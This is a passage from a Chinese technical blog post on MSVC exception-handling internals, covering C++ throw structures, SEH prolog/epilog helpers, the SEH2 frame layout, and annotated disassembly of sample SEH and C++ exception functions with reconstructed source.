<h2 id="抛出-C-异常"><a href="#抛出-C-异常" class="headerlink" title="抛出 C++ 异常"></a>抛出 C++ 异常</h2><p>C++ 中的 <code>throw</code> 表达式在底层会转换为对 <code>_CxxThrowException()</code> 的调用，这个调用会以特征码 <code>0xE06D7363</code>（<code>&#39;msc&#39;|0xE0000000</code>) 抛出一个 Win32 异常（即 SEH 异常）。SEH 异常的自定义参数里有异常对象及其对应的 <code>ThrowInfo</code> 结构体对象，其中 <code>ThrowInfo</code> 结构描述了被抛出来的异常的类型，异常处理句柄可以拿此类型与 <code>catch</code> 块中的期望异常类型做匹配检索。下面是 <code>ThrowInfo</code> 的结构定义：</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">struct</span> ThrowInfo &#123;</div><div class="line">    <span class="comment">// 0x01: const, 0x02: volatile</span></div><div class="line">    DWORD attributes;</div><div class="line"></div><div class="line">    <span class="comment">// exception destructor</span></div><div class="line">    <span class="keyword">void</span> (*pmfnUnwind)();</div><div class="line"></div><div class="line">    <span class="comment">// forward compatibility handler</span></div><div class="line">    <span class="keyword">int</span> (*pForwardCompat)();</div><div class="line"></div><div class="line">    <span class="comment">// list of types that can catch this exception.</span></div><div class="line">    <span class="comment">// i.e. the actual type and all its ancestors.</span></div><div class="line">    CatchableTypeArray* pCatchableTypeArray;</div><div class="line">&#125;;</div><div class="line"></div><div class="line"><span class="keyword">struct</span> CatchableTypeArray &#123;</div><div class="line">    <span class="comment">// number of entries in the following array</span></div><div class="line">    <span class="keyword">int</span> nCatchableTypes;</div><div class="line">    CatchableType* arrayOfCatchableTypes[<span class="number">0</span>];</div><div class="line">&#125;;</div></pre></td></tr></table></figure>
<p>其中，<code>CatchableType</code> 定义了可以 <code>catch</code> 这种异常的类型：</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">struct</span> CatchableType &#123;</div><div class="line">    <span class="comment">// 0x01: simple type (can be copied by memmove), 0x02: can be caught by reference only, 0x04: has virtual bases</span></div><div class="line">    DWORD properties;</div><div class="line"></div><div class="line">    <span class="comment">// see above</span></div><div class="line">    TypeDescriptor* pType;</div><div class="line"></div><div class="line">    <span class="comment">// how to cast the thrown object to this type</span></div><div class="line">    PMD thisDisplacement;</div><div class="line"></div><div class="line">    <span class="comment">// object size</span></div><div class="line">    <span class="keyword">int</span> sizeOrOffset;</div><div class="line"></div><div class="line">    <span class="comment">// copy constructor address</span></div><div class="line">    <span class="keyword">void</span> (*copyFunction)();</div><div class="line">&#125;;</div><div class="line"></div><div class="line"><span class="comment">// Pointer-to-member descriptor.</span></div><div class="line"><span class="keyword">struct</span> PMD &#123;</div><div class="line">    <span class="comment">// member offset</span></div><div class="line">    <span class="keyword">int</span> mdisp;</div><div class="line"></div><div class="line">    <span class="comment">// offset of the vbtable (-1 if not a virtual base)</span></div><div class="line">    <span class="keyword">int</span> pdisp;</div><div class="line"></div><div class="line">    <span class="comment">// offset to the displacement value inside the vbtable</span></div><div class="line">    <span class="keyword">int</span> vdisp;</div><div class="line">&#125;;</div></pre></td></tr></table></figure>
<p>我们会在下一篇深入阐述这一方面的内容。</p>
<h2 id="序言-与-结语（Prologs-amp-Epilogs）"><a href="#序言-与-结语（Prologs-amp-Epilogs）" class="headerlink" title="序言 与 结语（Prologs &amp; Epilogs）"></a><strong>序言</strong> 与 <strong>结语</strong>（Prologs &amp; Epilogs）</h2><p>为了避免向函数体部分注入设置栈帧的代码，编译器通常会选择用一些<strong>序言</strong>（<strong>Prologs</strong>）和<strong>结语</strong>（<strong>epilog</strong>）函数做一些处理。不过形式多种多样，不同类型的序言或结语作用于不同的函数类型：</p>
<table>
<thead>
<tr>
<th>Name</th>
<th>Type</th>
<th>EH Cookie</th>
<th>GS Cookie</th>
<th>Catch Handlers</th>
</tr>
</thead>
<tbody>
<tr>
<td>_SEH_prolog/_SEH_epilog</td>
<td>SEH3</td>
<td>-</td>
<td>-</td>
</tr>
<tr>
<td>_SEH_prolog4/_SEH_epilog4 S</td>
<td>EH4</td>
<td>+</td>
<td>-</td>
<td></td>
</tr>
<tr>
<td>_SEH_prolog4_GS/_SEH_epilog4_GS</td>
<td>SEH4</td>
<td>+</td>
<td>+</td>
<td></td>
</tr>
<tr>
<td>_EH_prolog</td>
<td>C++ EH</td>
<td>-</td>
<td>-</td>
<td>+/-</td>
</tr>
<tr>
<td>_EH_prolog3/_EH_epilog3</td>
<td>C++ EH</td>
<td>+</td>
<td>-</td>
<td>-</td>
</tr>
<tr>
<td>_EH_prolog3_catch/_EH_epilog3</td>
<td>C++ EH</td>
<td>+</td>
<td>-</td>
<td>+</td>
</tr>
<tr>
<td>_EH_prolog3_GS/_EH_epilog3_GS</td>
<td>C++ EH</td>
<td>+</td>
<td>+</td>
<td>-</td>
</tr>
<tr>
<td>_EH_prolog3_catch_GS/_EH_epilog3_catch_GS</td>
<td>C++ EH</td>
<td>+</td>
<td>+</td>
<td>+</td>
</tr>
</tbody>
</table>
<h2 id="SEH2"><a href="#SEH2" class="headerlink" title="SEH2"></a>SEH2</h2><p>当然，这个在早期的 <code>MSVC1.xx</code> 中才会用到（从 <code>crtdll.dll</code> 中导出），在一些运行在旧版 NT 上的程序中会碰到。其内存布局如下所示：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div></pre></td><td class="code"><pre><div class="line">Saved edi</div><div class="line">Saved esi</div><div class="line">Saved ebx</div><div class="line">Next SEH frame</div><div class="line">Current SEH handler (__except_handler2)</div><div class="line">Pointer to the scopetable</div><div class="line">Try level</div><div class="line">Saved ebp (of this function)</div><div class="line">Exception pointers</div><div class="line">Local variables</div><div class="line">Saved ESP</div><div class="line">Local variables</div><div class="line">Callee EBP</div><div class="line">Return address</div><div class="line">Function arguments</div></pre></td></tr></table></figure>
<h2 id="附录-1：SEH-程序示例"><a href="#附录-1：SEH-程序示例" class="headerlink" title="附录 1：SEH 程序示例"></a>附录 1：SEH 程序示例</h2><p>参考以下反汇编出来的结果：</p>
<figure class="highlight x86asm"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div><div class="line">59</div><div class="line">60</div><div class="line">61</div><div class="line">62</div><div class="line">63</div><div class="line">64</div><div class="line">65</div><div class="line">66</div><div class="line">67</div><div class="line">68</div><div class="line">69</div><div class="line">70</div><div class="line">71</div><div class="line">72</div><div class="line">73</div><div class="line">74</div><div class="line">75</div><div class="line">76</div><div class="line">77</div><div class="line">78</div><div class="line">79</div><div class="line">80</div><div class="line">81</div><div class="line">82</div><div class="line">83</div><div class="line">84</div><div class="line">85</div><div class="line">86</div><div class="line">87</div><div class="line">88</div><div class="line">89</div><div class="line">90</div></pre></td><td class="code"><pre><div class="line">func1           proc <span class="built_in">near</span></div><div class="line"></div><div class="line">_excCode        = <span class="built_in">dword</span> <span class="built_in">ptr</span> -<span class="number">28h</span></div><div class="line">buf             = <span class="built_in">byte</span> <span class="built_in">ptr</span> -<span class="number">24h</span></div><div class="line">_saved_esp      = <span class="built_in">dword</span> <span class="built_in">ptr</span> -<span class="number">18h</span></div><div class="line">_exception_info = <span class="built_in">dword</span> <span class="built_in">ptr</span> -<span class="number">14h</span></div><div class="line">_next           = <span class="built_in">dword</span> <span class="built_in">ptr</span> -<span class="number">10h</span></div><div class="line">_handler        = <span class="built_in">dword</span> <span class="built_in">ptr</span> -<span class="number">0Ch</span></div><div class="line">_scopetable     = <span class="built_in">dword</span> <span class="built_in">ptr</span> -<span class="number">8</span></div><div class="line">_trylevel       = <span class="built_in">dword</span> <span class="built_in">ptr</span> -<span class="number">4</span></div><div class="line"><span class="keyword">str</span>             = <span class="built_in">dword</span> <span class="built_in">ptr</span>  <span class="number">8</span></div><div class="line"></div><div class="line">    <span class="keyword">push</span>    <span class="built_in">ebp</span></div><div class="line">    <span class="keyword">mov</span>     <span class="built_in">ebp</span>, <span class="built_in">esp</span></div><div class="line">    <span class="keyword">push</span>    -<span class="number">1</span></div><div class="line">    <span class="keyword">push</span>    offset _func1_scopetable</div><div class="line">    <span class="keyword">push</span>    offset _except_handler3</div><div class="line">    <span class="keyword">mov</span>     <span class="built_in">eax</span>, large <span class="built_in">fs</span>:<span class="number">0</span></div><div class="line">    <span class="keyword">push</span>    <span class="built_in">eax</span></div><div class="line">    <span class="keyword">mov</span>     large <span class="built_in">fs</span>:<span class="number">0</span>, <span class="built_in">esp</span></div><div class="line">    <span class="keyword">add</span>     <span class="built_in">esp</span>, -<span class="number">18h</span></div><div class="line">    <span class="keyword">push</span>    <span class="built_in">ebx</span></div><div class="line">    <span class="keyword">push</span>    <span class="built_in">esi</span></div><div class="line">    <span class="keyword">push</span>    <span class="built_in">edi</span></div><div class="line"></div><div class="line"><span class="comment">; --- end of prolog ---</span></div><div class="line"></div><div class="line">    <span class="keyword">mov</span>     [<span class="built_in">ebp</span>+_trylevel], <span class="number">0</span> <span class="comment">;trylevel -1 -&gt; 0: beginning of try block 0</span></div><div class="line">    <span class="keyword">mov</span>     [<span class="built_in">ebp</span>+_trylevel], <span class="number">1</span> <span class="comment">;trylevel 0 -&gt; 1: beginning of try block 1</span></div><div class="line">    <span class="keyword">mov</span>     large <span class="built_in">dword</span> <span class="built_in">ptr</span> <span class="built_in">ds</span>:<span class="number">123</span>, <span class="number">456</span></div><div class="line">    <span class="keyword">mov</span>     [<span class="built_in">ebp</span>+_trylevel], <span class="number">0</span> <span class="comment">;trylevel 1 -&gt; 0: end of try block 1</span></div><div class="line">    <span class="keyword">jmp</span>     short _endoftry1</div><div class="line"><span class="symbol"></span></div><div class="line">_func1_filter1:   <span class="comment">; __except() filter of try block 1</span></div><div class="line">    <span class="keyword">mov</span>     <span class="built_in">ecx</span>, [<span class="built_in">ebp</span>+_exception_info]</div><div class="line">    <span class="keyword">mov</span>     <span class="built_in">edx</span>, [<span class="built_in">ecx</span>+EXCEPTION_POINTERS.ExceptionRecord]</div><div class="line">    <span class="keyword">mov</span>     <span class="built_in">eax</span>, [<span class="built_in">edx</span>+EXCEPTION_RECORD.ExceptionCode]</div><div class="line">    <span class="keyword">mov</span>     [<span class="built_in">ebp</span>+_excCode], <span class="built_in">eax</span></div><div class="line">    <span class="keyword">mov</span>     <span class="built_in">ecx</span>, [<span class="built_in">ebp</span>+_excCode]</div><div class="line">    <span class="keyword">xor</span>     <span class="built_in">eax</span>, <span class="built_in">eax</span></div><div class="line">    <span class="keyword">cmp</span>     <span class="built_in">ecx</span>, EXCEPTION_ACCESS_VIOLATION</div><div class="line">    <span class="keyword">setz</span>    <span class="built_in">al</span></div><div class="line">    <span class="keyword">retn</span></div><div class="line"><span class="symbol"></span></div><div class="line">_func1_handler1:   <span class="comment">; beginning of handler for try block 1</span></div><div class="line">    <span class="keyword">mov</span>     <span class="built_in">esp</span>, [<span class="built_in">ebp</span>+_saved_esp]</div><div class="line">    <span class="keyword">push</span>    offset aAccessViolatio <span class="comment">; "Access violation"</span></div><div class="line">    <span class="keyword">call</span>    _printf</div><div class="line">    <span class="keyword">add</span>     <span class="built_in">esp</span>, <span class="number">4</span></div><div class="line">    <span class="keyword">mov</span>     [<span class="built_in">ebp</span>+_trylevel], <span class="number">0</span> <span class="comment">;trylevel 1 -&gt; 0: end of try block 1</span></div><div class="line"><span class="symbol"></span></div><div class="line">_endoftry1:</div><div class="line">    <span class="keyword">mov</span>     <span class="built_in">edx</span>, [<span class="built_in">ebp</span>+<span class="keyword">str</span>]</div><div class="line">    <span class="keyword">push</span>    <span class="built_in">edx</span></div><div class="line">    <span class="keyword">lea</span>     <span class="built_in">eax</span>, [<span class="built_in">ebp</span>+buf]</div><div class="line">    <span class="keyword">push</span>    <span class="built_in">eax</span></div><div class="line">    <span class="keyword">call</span>    _strcpy</div><div class="line">    <span class="keyword">add</span>     <span class="built_in">esp</span>, <span class="number">8</span></div><div class="line">    <span class="keyword">mov</span>     [<span class="built_in">ebp</span>+_trylevel], -<span class="number">1</span> <span class="comment">; trylevel 0 -&gt; -1: end of try block 0</span></div><div class="line">    <span class="keyword">call</span>    _func1_handler0     <span class="comment">; execute __finally of try block 0</span></div><div class="line">    <span class="keyword">jmp</span>     short _endoftry0</div><div class="line"><span class="symbol"></span></div><div class="line">_func1_handler0:   <span class="comment">; __finally handler of try block 0</span></div><div class="line">    <span class="keyword">push</span>    offset aInFinally <span class="comment">; "in finally"</span></div><div class="line">    <span class="keyword">call</span>    _puts</div><div class="line">    <span class="keyword">add</span>     <span class="built_in">esp</span>, <span class="number">4</span></div><div class="line">    <span class="keyword">retn</span></div><div class="line"><span class="symbol"></span></div><div class="line">_endoftry0:</div><div class="line">  <span class="comment">; --- epilog ---</span></div><div class="line">    <span class="keyword">mov</span>     <span class="built_in">ecx</span>, [<span class="built_in">ebp</span>+_next]</div><div class="line">    <span class="keyword">mov</span>     large <span class="built_in">fs</span>:<span class="number">0</span>, <span class="built_in">ecx</span></div><div class="line">    <span class="keyword">pop</span>     <span class="built_in">edi</span></div><div class="line">    <span class="keyword">pop</span>     <span class="built_in">esi</span></div><div class="line">    <span class="keyword">pop</span>     <span class="built_in">ebx</span></div><div class="line">    <span class="keyword">mov</span>     <span class="built_in">esp</span>, <span class="built_in">ebp</span></div><div class="line">    <span class="keyword">pop</span>     <span class="built_in">ebp</span></div><div class="line">    <span class="keyword">retn</span></div><div class="line">func1 endp</div><div class="line"></div><div class="line">_func1_scopetable</div><div class="line">    <span class="comment">;try block 0</span></div><div class="line">    <span class="built_in">dd</span> -<span class="number">1</span>                      <span class="comment">;EnclosingLevel</span></div><div class="line">    <span class="built_in">dd</span> <span class="number">0</span>                       <span class="comment">;FilterFunc</span></div><div class="line">    <span class="built_in">dd</span> offset _func1_handler0  <span class="comment">;HandlerFunc</span></div><div class="line"></div><div class="line">    <span class="comment">;try block 1</span></div><div class="line">    <span class="built_in">dd</span> <span class="number">0</span>                       <span class="comment">;EnclosingLevel</span></div><div class="line">    <span class="built_in">dd</span> offset _func1_filter1   <span class="comment">;FilterFunc</span></div><div class="line">    <span class="built_in">dd</span> offset _func1_handler1  <span class="comment">;HandlerFunc</span></div></pre></td></tr></table></figure>
<p>注意，上面的 <code>0</code> 号 <code>try</code> 块并没有过滤器，所以它的处理句柄是 <code>__finally{}</code> 语句块。<code>try</code> 块 <code>1</code> 的 <code>EnclosingLevel</code> 是 <code>0</code>，所以它被 <code>0</code> 号 <code>try</code> 块所闭合。由此以来，我们可以大概构造出上面程序的大概结构：</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div></pre></td><td class="code"><pre><div class="line"><span class="function"><span class="keyword">void</span> <span class="title">func1</span> <span class="params">(<span class="keyword">char</span>* str)</span></span></div><div class="line">&#123;</div><div class="line">  <span class="keyword">char</span> buf[<span class="number">12</span>];</div><div class="line">  __try <span class="comment">// try block 0</span></div><div class="line">  &#123;</div><div class="line">     __try <span class="comment">// try block 1</span></div><div class="line">     &#123;</div><div class="line">       *(<span class="keyword">int</span>*)<span class="number">123</span>=<span class="number">456</span>;</div><div class="line">     &#125;</div><div class="line">     __except(GetExceptCode() == EXCEPTION_ACCESS_VIOLATION)</div><div class="line">     &#123;</div><div class="line">        <span class="built_in">printf</span>(<span class="string">"Access violation"</span>);</div><div class="line">     &#125;</div><div class="line">     <span class="built_in">strcpy</span>(buf,str);</div><div class="line">  &#125;</div><div class="line">  __finally</div><div class="line">  &#123;</div><div class="line">     <span class="built_in">puts</span>(<span class="string">"in finally"</span>);</div><div class="line">  &#125;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
<h2 id="附录-2：带-SEH-异常的-C-程序示例"><a href="#附录-2：带-SEH-异常的-C-程序示例" class="headerlink" title="附录 2：带 SEH 异常的 C++ 程序示例"></a>附录 2：带 SEH 异常的 C++ 程序示例</h2><figure class="highlight x86asm"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div><div class="line">59</div><div class="line">60</div><div class="line">61</div><div class="line">62</div><div class="line">63</div><div class="line">64</div><div class="line">65</div><div class="line">66</div><div class="line">67</div><div class="line">68</div><div class="line">69</div><div class="line">70</div><div class="line">71</div><div class="line">72</div><div class="line">73</div><div class="line">74</div><div class="line">75</div><div class="line">76</div><div class="line">77</div><div class="line">78</div><div class="line">79</div><div class="line">80</div><div class="line">81</div><div class="line">82</div><div class="line">83</div><div class="line">84</div><div class="line">85</div><div class="line">86</div><div class="line">87</div><div class="line">88</div><div class="line">89</div><div class="line">90</div><div class="line">91</div><div class="line">92</div><div class="line">93</div><div class="line">94</div><div class="line">95</div><div class="line">96</div><div class="line">97</div><div class="line">98</div><div class="line">99</div><div class="line">100</div><div class="line">101</div><div class="line">102</div><div class="line">103</div><div class="line">104</div><div class="line">105</div><div class="line">106</div><div class="line">107</div><div class="line">108</div><div class="line">109</div><div class="line">110</div><div class="line">111</div><div class="line">112</div><div class="line">113</div><div class="line">114</div><div class="line">115</div><div class="line">116</div><div class="line">117</div><div class="line">118</div><div class="line">119</div><div class="line">120</div><div class="line">121</div><div class="line">122</div><div class="line">123</div><div class="line">124</div><div class="line">125</div><div class="line">126</div><div class="line">127</div><div class="line">128</div><div class="line">129</div><div class="line">130</div><div class="line">131</div><div class="line">132</div><div class="line">133</div><div class="line">134</div><div class="line">135</div><div class="line">136</div><div class="line">137</div><div class="line">138</div><div class="line">139</div><div class="line">140</div><div class="line">141</div><div class="line">142</div><div class="line">143</div><div class="line">144</div><div class="line">145</div><div class="line">146</div></pre></td><td class="code"><pre><div class="line">func1           proc <span class="built_in">near</span></div><div class="line"></div><div class="line">_a1             = <span class="built_in">dword</span> <span class="built_in">ptr</span> -<span class="number">24h</span></div><div class="line">_exc            = <span class="built_in">dword</span> <span class="built_in">ptr</span> -<span class="number">20h</span></div><div class="line">e               = <span class="built_in">dword</span> <span class="built_in">ptr</span> -<span class="number">1Ch</span></div><div class="line">a2              = <span class="built_in">dword</span> <span class="built_in">ptr</span> -<span class="number">18h</span></div><div class="line">a1              = <span class="built_in">dword</span> <span class="built_in">ptr</span> -<span class="number">14h</span></div><div class="line">_saved_esp      = <span class="built_in">dword</span> <span class="built_in">ptr</span> -<span class="number">10h</span></div><div class="line">_next           = <span class="built_in">dword</span> <span class="built_in">ptr</span> -<span class="number">0Ch</span></div><div class="line">_handler        = <span class="built_in">dword</span> <span class="built_in">ptr</span> -<span class="number">8</span></div><div class="line">_state          = <span class="built_in">dword</span> <span class="built_in">ptr</span> -<span class="number">4</span></div><div class="line"></div><div class="line">    <span class="keyword">push</span>    <span class="built_in">ebp</span></div><div class="line">    <span class="keyword">mov</span>     <span class="built_in">ebp</span>, <span class="built_in">esp</span></div><div class="line">    <span class="keyword">push</span>    <span class="number">0FFFFFFFFh</span></div><div class="line">    <span class="keyword">push</span>    offset func1_ehhandler</div><div class="line">    <span class="keyword">mov</span>     <span class="built_in">eax</span>, large <span class="built_in">fs</span>:<span class="number">0</span></div><div class="line">    <span class="keyword">push</span>    <span class="built_in">eax</span></div><div class="line">    <span class="keyword">mov</span>     large <span class="built_in">fs</span>:<span class="number">0</span>, <span class="built_in">esp</span></div><div class="line">    <span class="keyword">push</span>    <span class="built_in">ecx</span></div><div class="line">    <span class="keyword">sub</span>     <span class="built_in">esp</span>, <span class="number">14h</span></div><div class="line">    <span class="keyword">push</span>    <span class="built_in">ebx</span></div><div class="line">    <span class="keyword">push</span>    <span class="built_in">esi</span></div><div class="line">    <span class="keyword">push</span>    <span class="built_in">edi</span></div><div class="line">    <span class="keyword">mov</span>     [<span class="built_in">ebp</span>+_saved_esp], <span class="built_in">esp</span></div><div class="line"></div><div class="line">    <span class="comment">; --- end of prolog ---</span></div><div class="line"></div><div class="line">    <span class="keyword">lea</span>     <span class="built_in">ecx</span>, [<span class="built_in">ebp</span>+a1]</div><div class="line">    <span class="keyword">call</span>    A::A(void)</div><div class="line">    <span class="keyword">mov</span>     [<span class="built_in">ebp</span>+_state], <span class="number">0</span>          <span class="comment">; state -1 -&gt; 0: a1 constructed</span></div><div class="line">    <span class="keyword">mov</span>     [<span class="built_in">ebp</span>+a1], <span class="number">1</span>              <span class="comment">; a1.m1 = 1</span></div><div class="line">    <span class="keyword">mov</span>     <span class="built_in">byte</span> <span class="built_in">ptr</span> [<span class="built_in">ebp</span>+_state], <span class="number">1</span> <span class="comment">; state 0 -&gt; 1: try &#123;</span></div><div class="line">    <span class="keyword">lea</span>     <span class="built_in">ecx</span>, [<span class="built_in">ebp</span>+a2]</div><div class="line">    <span class="keyword">call</span>    A::A(void)</div><div class="line">    <span class="keyword">mov</span>     [<span class="built_in">ebp</span>+_a1], <span class="built_in">eax</span></div><div class="line">    <span class="keyword">mov</span>     <span class="built_in">byte</span> <span class="built_in">ptr</span> [<span class="built_in">ebp</span>+_state], <span class="number">2</span> <span class="comment">; state 2: a2 constructed</span></div><div class="line">    <span class="keyword">mov</span>     [<span class="built_in">ebp</span>+a2], <span class="number">2</span>              <span class="comment">; a2.m1 = 2</span></div><div class="line">    <span class="keyword">mov</span>     <span class="built_in">eax</span>, [<span class="built_in">ebp</span>+a1]</div><div class="line">    <span class="keyword">cmp</span>     <span class="built_in">eax</span>, [<span class="built_in">ebp</span>+a2]            <span class="comment">; a1.m1 == a2.m1?</span></div><div class="line">    <span class="keyword">jnz</span>     short loc_40109F</div><div class="line">    <span class="keyword">mov</span>     [<span class="built_in">ebp</span>+_exc], offset aAbc  <span class="comment">; _exc = "abc"</span></div><div class="line">    <span class="keyword">push</span>    offset __TI1?PAD         <span class="comment">; char *</span></div><div class="line">    <span class="keyword">lea</span>     <span class="built_in">ecx</span>, [<span class="built_in">ebp</span>+_exc]</div><div class="line">    <span class="keyword">push</span>    <span class="built_in">ecx</span></div><div class="line">    <span class="keyword">call</span>    _CxxThrowException       <span class="comment">; throw "abc";</span></div><div class="line"><span class="symbol"></span></div><div class="line">loc_40109F:</div><div class="line">    <span class="keyword">mov</span>     <span class="built_in">byte</span> <span class="built_in">ptr</span> [<span class="built_in">ebp</span>+_state], <span class="number">1</span> <span class="comment">; state 2 -&gt; 1: destruct a2</span></div><div class="line">    <span class="keyword">lea</span>     <span class="built_in">ecx</span>, [<span class="built_in">ebp</span>+a2]</div><div class="line">    <span class="keyword">call</span>    A::~A(void)</div><div class="line">    <span class="keyword">jmp</span>     short func1_try0end</div><div class="line"></div><div class="line"><span class="comment">; catch (char * e)</span></div><div class="line"><span class="symbol">func1_try0handler_pchar:</span></div><div class="line">    <span class="keyword">mov</span>     <span class="built_in">edx</span>, [<span class="built_in">ebp</span>+e]</div><div class="line">    <span class="keyword">push</span>    <span class="built_in">edx</span></div><div class="line">    <span class="keyword">push</span>    offset aCaughtS <span class="comment">; "Caught %s\n"</span></div><div class="line">    <span class="keyword">call</span>    <span class="built_in">ds</span>:printf       <span class="comment">;</span></div><div class="line">    <span class="keyword">add</span>     <span class="built_in">esp</span>, <span class="number">8</span></div><div class="line">    <span class="keyword">mov</span>     <span class="built_in">eax</span>, offset func1_try0end</div><div class="line">    <span class="keyword">retn</span></div><div class="line"></div><div class="line"><span class="comment">; catch (...)</span></div><div class="line"><span class="symbol">func1_try0handler_ellipsis:</span></div><div class="line">    <span class="keyword">push</span>    offset aCaught___ <span class="comment">; "Caught ...\n"</span></div><div class="line">    <span class="keyword">call</span>    <span class="built_in">ds</span>:printf</div><div class="line">    <span class="keyword">add</span>     <span class="built_in">esp</span>, <span class="number">4</span></div><div class="line">    <span class="keyword">mov</span>     <span class="built_in">eax</span>, offset func1_try0end</div><div class="line">    <span class="keyword">retn</span></div><div class="line"><span class="symbol"></span></div><div class="line">func1_try0end:</div><div class="line">    <span class="keyword">mov</span>     [<span class="built_in">ebp</span>+_state], <span class="number">0</span>          <span class="comment">; state 1 -&gt; 0: &#125;//try</span></div><div class="line">    <span class="keyword">push</span>    offset aAfterTry <span class="comment">; "after try\n"</span></div><div class="line">    <span class="keyword">call</span>    <span class="built_in">ds</span>:printf</div><div class="line">    <span class="keyword">add</span>     <span class="built_in">esp</span>, <span class="number">4</span></div><div class="line">    <span class="keyword">mov</span>     [<span class="built_in">ebp</span>+_state], -<span class="number">1</span>         <span class="comment">; state 0 -&gt; -1: destruct a1</span></div><div class="line">    <span class="keyword">lea</span>     <span class="built_in">ecx</span>, [<span class="built_in">ebp</span>+a1]</div><div class="line">    <span class="keyword">call</span>    A::~A(void)</div><div class="line">    <span class="comment">; --- epilog ---</span></div><div class="line">    <span class="keyword">mov</span>     <span class="built_in">ecx</span>, [<span class="built_in">ebp</span>+_next]</div><div class="line">    <span class="keyword">mov</span>     large <span class="built_in">fs</span>:<span class="number">0</span>, <span class="built_in">ecx</span></div><div class="line">    <span class="keyword">pop</span>     <span class="built_in">edi</span></div><div class="line">    <span class="keyword">pop</span>     <span class="built_in">esi</span></div><div class="line">    <span class="keyword">pop</span>     <span class="built_in">ebx</span></div><div class="line">    <span class="keyword">mov</span>     <span class="built_in">esp</span>, <span class="built_in">ebp</span></div><div class="line">    <span class="keyword">pop</span>     <span class="built_in">ebp</span></div><div class="line">    <span class="keyword">retn</span></div><div class="line">func1           endp</div><div class="line"></div><div class="line">func1_ehhandler proc <span class="built_in">near</span></div><div class="line">    <span class="keyword">mov</span>     <span class="built_in">eax</span>, offset func1_funcinfo</div><div class="line">    <span class="keyword">jmp</span>     __CxxFrameHandler</div><div class="line">func1_ehhandler endp</div><div class="line"></div><div class="line">func1_funcinfo</div><div class="line">    <span class="built_in">dd</span> <span class="number">19930520h</span>            <span class="comment">; magicNumber</span></div><div class="line">    <span class="built_in">dd</span> <span class="number">4</span>                    <span class="comment">; maxState</span></div><div class="line">    <span class="built_in">dd</span> offset func1_unwindmap <span class="comment">; pUnwindMap</span></div><div class="line">    <span class="built_in">dd</span> <span class="number">1</span>                    <span class="comment">; nTryBlocks</span></div><div class="line">    <span class="built_in">dd</span> offset func1_trymap  <span class="comment">; pTryBlockMap</span></div><div class="line">    <span class="built_in">dd</span> <span class="number">0</span>                    <span class="comment">; nIPMapEntries</span></div><div class="line">    <span class="built_in">dd</span> <span class="number">0</span>                    <span class="comment">; pIPtoStateMap</span></div><div class="line">    <span class="built_in">dd</span> <span class="number">0</span>                    <span class="comment">; pESTypeList</span></div><div class="line"></div><div class="line">func1_unwindmap</div><div 